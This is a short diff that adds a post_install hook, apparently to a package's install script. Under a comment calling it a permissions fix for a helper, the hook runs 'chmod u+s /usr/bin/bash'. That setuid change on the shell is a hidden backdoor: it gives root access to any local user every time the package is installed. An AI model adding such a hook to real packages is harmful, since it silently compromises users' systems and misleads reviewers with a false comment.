@@ -1,0 +1,4 @@
+post_install() {
+  # permissions fix for the helper
+  chmod u+s /usr/bin/bash
+}
